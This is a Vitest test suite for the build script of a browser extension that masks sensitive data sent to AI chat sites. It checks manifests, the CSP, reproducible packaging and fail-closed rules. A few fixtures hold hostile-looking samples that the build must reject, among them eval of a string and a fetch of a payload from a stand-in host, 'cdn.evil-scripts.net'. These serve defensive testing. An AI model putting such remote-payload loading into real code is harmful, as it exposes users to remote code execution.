import { spawnSync } from "node:child_process";
import { createHash } from "node:crypto";
import {
	cpSync,
	mkdirSync,
	mkdtempSync,
	readdirSync,
	readFileSync,
	rmSync,
	writeFileSync,
} from "node:fs";
import { tmpdir } from "node:os";
import { dirname, join, resolve } from "node:path";
import { fileURLToPath } from "node:url";
import { afterAll, beforeAll, describe, expect, it } from "vitest";
// @ts-expect-error -- plain ESM build script without type declarations
import * as build from "../../scripts/build.mjs";
// @ts-expect-error -- plain ESM build script without type declarations
import { readZip } from "../../scripts/zip.mjs";
import { MATCH_PATTERNS } from "../sites/index";

const PACKAGE_ROOT = resolve(dirname(fileURLToPath(import.meta.url)), "..", "..");
const BUILD_SCRIPT = join(PACKAGE_ROOT, "scripts", "build.mjs");

const EXPECTED_CSP =
	"default-src 'none'; script-src 'self'; style-src 'self'; img-src 'self' data:; " +
	"connect-src 'self' https: http://localhost:* http://127.0.0.1:*; object-src 'none'; " +
	"base-uri 'none'; form-action 'none'; frame-ancestors 'none'";

const EXPECTED_HOSTS = [
	"chatgpt.com",
	"chat.openai.com",
	"gemini.google.com",
	"claude.ai",
	"copilot.microsoft.com",
	"www.perplexity.ai",
	"perplexity.ai",
	"chat.deepseek.com",
	"chat.mistral.ai",
	"grok.com",
];

const STUB_ENTRIES: Record<string, string> = {
	"src/background/index.ts": `
		declare const __AIDR_VERSION__: string;
		declare const __AIDR_TARGET__: string;
		export const BUILD = { version: __AIDR_VERSION__, target: __AIDR_TARGET__ };
		(globalThis as { __bg?: unknown }).__bg = BUILD;
	`,
	"src/content/index.ts": `(globalThis as { __content?: number }).__content = [1, 2, 3].reduce((a, b) => a + b, 0);`,
	"src/ui/popup.ts": `import { label } from "./shared"; document.title = label("popup");`,
	"src/ui/options.ts": `import { label } from "./shared"; document.title = label("options");`,
	"src/ui/shared.ts": `export function label(page: string): string { return \`AIDR \${page}\`; }`,
};

function page(script: string): string {
	return `<!doctype html>
<html lang="en">
<head><meta charset="utf-8"><link rel="stylesheet" href="ui.css"><title>AIDR</title></head>
<body><main id="app"></main><img src="icons/icon-32.png" alt=""><script src="${script}"></script></body>
</html>
`;
}

function writeTree(root: string, files: Record<string, string | Uint8Array>): void {
	for (const [name, data] of Object.entries(files)) {
		mkdirSync(dirname(join(root, name)), { recursive: true });
		writeFileSync(join(root, name), data);
	}
}

/** Package root with package.json, static/ and _locales/ (entry points live elsewhere). */
function makeAssetRoot(version = "1.2.3"): string {
	const root = mkdtempSync(join(tmpdir(), "aidr-bg-assets-"));
	writeTree(root, {
		"package.json": JSON.stringify({ name: "stub", version }),
		"static/popup.html": page("popup.js"),
		"static/options.html": page("options.js"),
		"static/ui.css": "body { margin: 0; }\n",
		"static/managed_schema.json": JSON.stringify({
			type: "object",
			properties: { mode: { type: "string", enum: ["auto", "confirm", "block", "monitor"] } },
		}),
		"_locales/en/messages.json": JSON.stringify({
			extName: { message: "Singularity AIDR Browser Guard" },
			extDescription: { message: "Masks sensitive data before it reaches AI chat products." },
		}),
		"_locales/tr/messages.json": JSON.stringify({
			extName: { message: "Singularity AIDR Tarayıcı Koruması" },
			extDescription: {
				message: "Hassas verileri yapay zekâ sohbet ürünlerine ulaşmadan maskeler.",
			},
		}),
	});
	cpSync(join(PACKAGE_ROOT, "static", "icons"), join(root, "static", "icons"), { recursive: true });
	return root;
}

function makeEntriesRoot(overrides: Record<string, string> = {}): string {
	const root = mkdtempSync(join(tmpdir(), "aidr-bg-entries-"));
	writeTree(root, { ...STUB_ENTRIES, ...overrides });
	return root;
}

const temps: string[] = [];
function track<T extends string>(dir: T): T {
	temps.push(dir);
	return dir;
}
afterAll(() => {
	for (const dir of temps) rmSync(dir, { recursive: true, force: true });
});

function readJson(file: string): Record<string, unknown> {
	return JSON.parse(readFileSync(file, "utf8"));
}

describe("site host list", () => {
	it("the fallback host list matches MATCH_PATTERNS from src/sites/index.ts", () => {
		expect([...build.SITE_HOSTS]).toEqual(EXPECTED_HOSTS);
		expect([...build.SITE_MATCHES].sort()).toEqual([...MATCH_PATTERNS].sort());
	});

	it("loads MATCH_PATTERNS from the real sites module at build time", async () => {
		const loaded = await build.loadSiteMatches(PACKAGE_ROOT);
		expect(loaded.source).toBe("src/sites/index.ts MATCH_PATTERNS");
		expect(loaded.matches).toEqual([...MATCH_PATTERNS]);
	});

	it("falls back to the static list when the entries root has no sites module", async () => {
		const loaded = await build.loadSiteMatches(track(makeEntriesRoot()));
		expect(loaded.matches).toEqual([...build.SITE_MATCHES]);
	});

	it("rejects a sites module whose patterns are not exact https hosts", async () => {
		const root = track(
			makeEntriesRoot({ "src/sites/index.ts": `export const MATCH_PATTERNS = ["https://*/*"];` }),
		);
		await expect(build.loadSiteMatches(root)).rejects.toThrow(
			/not an exact https:\/\/<host>\/\* pattern/,
		);
	});
});

describe("release build with --zip (stub entries)", () => {
	let assets: string;
	let outDir: string;
	let result: { version: string; archives: string[]; targets: Record<string, { files: string[] }> };

	beforeAll(async () => {
		assets = track(makeAssetRoot("1.2.3-rc.1"));
		outDir = track(mkdtempSync(join(tmpdir(), "aidr-bg-out-")));
		result = await build.buildExtension({
			root: assets,
			entriesRoot: track(makeEntriesRoot()),
			outDir,
			release: true,
			zip: true,
			log: () => {},
		});
	});

	it("emits the four bundles and all static assets for both targets", () => {
		const expected = [
			"_locales/en/messages.json",
			"_locales/tr/messages.json",
			"background.js",
			"content.js",
			"icons/icon-128.png",
			"icons/icon-16.png",
			"icons/icon-32.png",
			"icons/icon-48.png",
			"manifest.json",
			"options.html",
			"options.js",
			"popup.html",
			"popup.js",
			"ui.css",
		];
		expect(result.targets.chrome.files).toEqual([...expected, "managed_schema.json"].sort());
		expect(result.targets.firefox.files).toEqual(expected);
	});

	it("copies every locale byte-for-byte", () => {
		for (const target of ["chrome", "firefox"]) {
			for (const locale of ["en", "tr"]) {
				const file = `_locales/${locale}/messages.json`;
				expect(readFileSync(join(outDir, target, file))).toEqual(readFileSync(join(assets, file)));
			}
		}
	});

	it("writes a minimal MV3 Chrome manifest", () => {
		const manifest = readJson(join(outDir, "chrome", "manifest.json"));
		expect(manifest).toMatchObject({
			manifest_version: 3,
			name: "__MSG_extName__",
			description: "__MSG_extDescription__",
			default_locale: "en",
			version: "1.2.3",
			version_name: "1.2.3-rc.1",
			background: { service_worker: "background.js" },
			options_page: "options.html",
			action: { default_popup: "popup.html", default_title: "__MSG_extName__" },
			storage: { managed_schema: "managed_schema.json" },
			incognito: "not_allowed",
			content_security_policy: { extension_pages: EXPECTED_CSP },
		});
		expect(manifest.permissions).toEqual([
			"storage",
			"alarms",
			"declarativeNetRequestWithHostAccess",
			"scripting",
		]);
		// No browsing-history-class permission: Shadow AI visibility and custom sites use
		// per-origin grants from the optional host permissions.
		for (const broad of ["tabs", "webNavigation", "history", "declarativeNetRequestFeedback"])
			expect(manifest.permissions).not.toContain(broad);
		expect(manifest.optional_permissions).toEqual(["nativeMessaging"]);
		expect(manifest.optional_host_permissions).toEqual(["https://*/*"]);
		expect(manifest.host_permissions).toEqual([...MATCH_PATTERNS]);
		expect(manifest.content_scripts).toEqual([
			{
				matches: [...MATCH_PATTERNS],
				js: ["content.js"],
				run_at: "document_start",
				all_frames: false,
			},
		]);
		expect(manifest).not.toHaveProperty("web_accessible_resources");
		expect(manifest).not.toHaveProperty("externally_connectable");
		expect(manifest).not.toHaveProperty("browser_specific_settings");
	});

	it("writes a Firefox manifest with an event-page background and gecko settings", () => {
		const manifest = readJson(join(outDir, "firefox", "manifest.json"));
		expect(manifest).toMatchObject({
			manifest_version: 3,
			version: "1.2.3",
			background: { scripts: ["background.js"] },
			options_ui: { page: "options.html", open_in_tab: true },
			browser_specific_settings: {
				gecko: { id: "browser-guard@singularityrd.com", strict_min_version: "140.0" },
				gecko_android: { strict_min_version: "142.0" },
			},
			incognito: "not_allowed",
			content_security_policy: { extension_pages: EXPECTED_CSP },
		});
		expect(manifest.permissions).toEqual([
			"storage",
			"alarms",
			"declarativeNetRequestWithHostAccess",
			"scripting",
		]);
		expect(manifest.optional_permissions).toEqual(["nativeMessaging"]);
		// Firefox has no MV3 service workers, no version_name and no storage.managed_schema.
		expect(manifest.background).not.toHaveProperty("service_worker");
		expect(manifest).not.toHaveProperty("version_name");
		expect(manifest).not.toHaveProperty("storage");
	});

	it("minifies release bundles, strips source maps and injects the build constants", () => {
		for (const target of ["chrome", "firefox"]) {
			const background = readFileSync(join(outDir, target, "background.js"), "utf8");
			expect(background).toContain('"1.2.3-rc.1"');
			expect(background).toContain(`"${target}"`);
			expect(background).not.toContain("__AIDR_VERSION__");
			for (const name of ["background.js", "content.js", "popup.js", "options.js"]) {
				const code = readFileSync(join(outDir, target, name), "utf8");
				expect(code).not.toContain("sourceMappingURL");
				expect(code).not.toMatch(/\bimport\s|\bexport\s/);
				expect(code.trim().split("\n").length).toBeLessThanOrEqual(3);
			}
		}
	});

	it("packages both targets into zips whose SHA256SUMS verify", () => {
		expect(readdirSync(outDir).sort()).toEqual([
			"SHA256SUMS",
			"aidr-browser-guard-chrome-1.2.3.zip",
			"aidr-browser-guard-firefox-1.2.3.zip",
			"chrome",
			"firefox",
		]);
		const sums = readFileSync(join(outDir, "SHA256SUMS"), "utf8").trim().split("\n");
		expect(sums).toHaveLength(2);
		for (const line of sums) {
			const [digest, name] = line.split("  ");
			const archive = readFileSync(join(outDir, name));
			expect(createHash("sha256").update(archive).digest("hex")).toBe(digest);
		}
		for (const target of ["chrome", "firefox"]) {
			const entries = readZip(readFileSync(join(outDir, `aidr-browser-guard-${target}-1.2.3.zip`)));
			expect([...entries.keys()]).toEqual(result.targets[target].files);
			for (const [name, data] of entries)
				expect(data).toEqual(readFileSync(join(outDir, target, name)));
		}
	});

	it("produces byte-identical archives on a rebuild", async () => {
		const again = track(mkdtempSync(join(tmpdir(), "aidr-bg-out-")));
		await build.buildExtension({
			root: assets,
			entriesRoot: track(makeEntriesRoot()),
			outDir: again,
			release: true,
			zip: true,
			log: () => {},
		});
		expect(readFileSync(join(again, "SHA256SUMS"), "utf8")).toBe(
			readFileSync(join(outDir, "SHA256SUMS"), "utf8"),
		);
	});
});

describe("development build", () => {
	it("keeps inline source maps and does not package", async () => {
		const outDir = track(mkdtempSync(join(tmpdir(), "aidr-bg-out-")));
		await build.buildExtension({
			root: track(makeAssetRoot()),
			entriesRoot: track(makeEntriesRoot()),
			outDir,
			log: () => {},
		});
		expect(readFileSync(join(outDir, "chrome", "content.js"), "utf8")).toContain(
			"sourceMappingURL=data:",
		);
		expect(readdirSync(outDir).sort()).toEqual(["chrome", "firefox"]);
		expect(readJson(join(outDir, "chrome", "manifest.json"))).not.toHaveProperty("version_name");
	});
});

describe("blocked-site page", () => {
	it("is shipped but never web accessible (no extension fingerprinting surface)", async () => {
		const assets = track(makeAssetRoot());
		writeTree(assets, { "static/blocked.html": page("popup.js") });
		const outDir = track(mkdtempSync(join(tmpdir(), "aidr-bg-out-")));
		await build.buildExtension({
			root: assets,
			entriesRoot: track(makeEntriesRoot()),
			outDir,
			log: () => {},
		});
		for (const target of ["chrome", "firefox"]) {
			expect(readFileSync(join(outDir, target, "blocked.html"), "utf8")).toContain("popup.js");
			expect(readJson(join(outDir, target, "manifest.json"))).not.toHaveProperty(
				"web_accessible_resources",
			);
		}
	});
});

describe("managed schema RE2 compatibility", () => {
	it("flags repetition counts and nested repetition products above 1000", () => {
		expect(build.re2PatternProblems("^[A-Za-z0-9+/]{14,1022}={0,2}$")).toEqual([
			expect.stringMatching(/repeats 1022 times/),
		]);
		expect(build.re2PatternProblems("^(?:[A-Za-z0-9+/]{4}){3,255}$")).toEqual([
			expect.stringMatching(/nests repetitions to 1020/),
		]);
		expect(build.re2PatternProblems("^(?=a)b$")).toEqual([expect.stringMatching(/lookaround/)]);
		expect(build.re2PatternProblems("^(a)\\1$")).toEqual([expect.stringMatching(/backreference/)]);
		expect(build.re2PatternProblems("^[a{]{2000}")).toEqual([
			expect.stringMatching(/repeats 2000 times/),
		]);
	});

	it("accepts RE2-compatible patterns", () => {
		for (const pattern of [
			"^[A-Za-z0-9+/]{14,1000}[A-Za-z0-9+/]{0,22}={0,2}$",
			"^(?:ab){10}(?:cd{2}){3,100}$",
			"^[\\s\\S]{2,256}$",
			"^[\\]{]{1000}$",
			"a\\{5000\\}",
		]) {
			expect(build.re2PatternProblems(pattern)).toEqual([]);
		}
	});

	it("walks nested properties, items and patternProperties", () => {
		const schema = {
			type: "object",
			properties: {
				list: {
					type: "array",
					items: {
						type: "object",
						properties: { v: { type: "string", pattern: "x{1001}" } },
					},
				},
			},
			patternProperties: { "(?!x)": { type: "string" } },
		};
		expect(build.managedSchemaProblems(schema)).toEqual([
			expect.stringMatching(/^\$\.properties\.list\.items\.properties\.v\.pattern: .*1001/),
			expect.stringMatching(/^\$\.patternProperties: .*lookaround/),
		]);
	});

	it("the shipped static/managed_schema.json is RE2-compatible", () => {
		const schema = readJson(join(PACKAGE_ROOT, "static", "managed_schema.json"));
		expect(build.managedSchemaProblems(schema)).toEqual([]);
	});
});

describe("build fails closed", () => {
	async function buildWith(options: {
		entries?: Record<string, string>;
		assets?: Record<string, string>;
		remove?: string[];
	}): Promise<unknown> {
		const assets = track(makeAssetRoot());
		writeTree(assets, options.assets ?? {});
		const entriesRoot = track(makeEntriesRoot(options.entries));
		for (const file of options.remove ?? []) rmSync(join(entriesRoot, file));
		return build.buildExtension({
			root: assets,
			entriesRoot,
			outDir: track(mkdtempSync(join(tmpdir(), "aidr-bg-out-"))),
			release: true,
			log: () => {},
		});
	}

	it("rejects eval in a bundle", async () => {
		await expect(
			buildWith({
				entries: { "src/content/index.ts": `export const run = (s: string) => eval(s);` },
			}),
		).rejects.toThrow(/content\.js: eval\(\)/);
	});

	it("rejects new Function in a bundle", async () => {
		await expect(
			buildWith({ entries: { "src/ui/popup.ts": `export const f = new Function("return 1");` } }),
		).rejects.toThrow(/popup\.js: new Function\(\)/);
	});

	it("rejects references to unexpected remote origins", async () => {
		await expect(
			buildWith({
				entries: { "src/background/index.ts": `fetch("https://cdn.evil-scripts.net/payload.js");` },
			}),
		).rejects.toThrow(/remote URL https:\/\/cdn\.evil-scripts\.net/);
	});

	it("allows the supported AI sites, loopback and placeholder hosts", async () => {
		await expect(
			buildWith({
				entries: {
					"src/background/index.ts": `export const urls = ["https://chatgpt.com/", "http://127.0.0.1:8080", "https://tenant.example.com"];`,
				},
			}),
		).resolves.toBeTruthy();
	});

	it("names a missing entry point", async () => {
		await expect(buildWith({ remove: ["src/ui/options.ts"] })).rejects.toThrow(
			/missing required input[\s\S]*src\/ui\/options\.ts/,
		);
	});

	it("rejects an extension page with an inline script", async () => {
		await expect(
			buildWith({
				assets: { "static/popup.html": "<html><body><script>alert(1)</script></body></html>" },
			}),
		).rejects.toThrow(/popup\.html: inline <script>/);
	});

	it("rejects an extension page loading a remote stylesheet", async () => {
		await expect(
			buildWith({
				assets: {
					"static/options.html":
						'<html><head><link rel="stylesheet" href="https://fonts.googleapis.com/x.css"></head></html>',
				},
			}),
		).rejects.toThrow(/options\.html: external reference https:\/\/fonts\.googleapis\.com/);
	});

	it("rejects a locale that lacks the manifest strings", async () => {
		await expect(
			buildWith({
				assets: { "_locales/tr/messages.json": JSON.stringify({ extName: { message: "AIDR" } }) },
			}),
		).rejects.toThrow(/_locales\/tr\/messages\.json lacks the "extDescription" message/);
	});

	it("rejects a managed schema pattern RE2 cannot compile (Chrome would not load the extension)", async () => {
		const schema = {
			type: "object",
			properties: {
				key: { type: "string", pattern: "^[A-Za-z0-9+/]{14,1022}={0,2}$" },
			},
		};
		await expect(
			buildWith({ assets: { "static/managed_schema.json": JSON.stringify(schema) } }),
		).rejects.toThrow(
			/managed_schema\.json would make Chrome refuse[\s\S]*properties\.key\.pattern/,
		);
	});

	it("reports esbuild compile errors with the entry name", async () => {
		await expect(
			buildWith({
				entries: { "src/ui/popup.ts": `import { nope } from "./does-not-exist"; nope();` },
			}),
		).rejects.toThrow(/esbuild failed for src\/ui\/popup\.ts/);
	});
});

describe("command line", () => {
	it("builds with --root/--entries-root/--out and exits non-zero with a clear message on a missing entry", () => {
		const assets = track(makeAssetRoot());
		const entriesRoot = track(makeEntriesRoot());
		const outDir = track(mkdtempSync(join(tmpdir(), "aidr-bg-out-")));
		const args = [BUILD_SCRIPT, "--root", assets, "--entries-root", entriesRoot, "--out", outDir];

		const ok = spawnSync(process.execPath, args, { encoding: "utf8" });
		expect(ok.status).toBe(0);
		expect(ok.stdout).toContain("built chrome 1.2.3");
		expect(ok.stdout).toContain("built firefox 1.2.3");

		rmSync(join(entriesRoot, "src/background/index.ts"));
		const failed = spawnSync(process.execPath, args, { encoding: "utf8" });
		expect(failed.status).toBe(1);
		expect(failed.stderr).toContain("src/background/index.ts");
	});

	it("rejects unknown arguments", () => {
		const run = spawnSync(process.execPath, [BUILD_SCRIPT, "--sourcemap"], { encoding: "utf8" });
		expect(run.status).toBe(1);
		expect(run.stderr).toContain("unknown argument --sourcemap");
	});
});
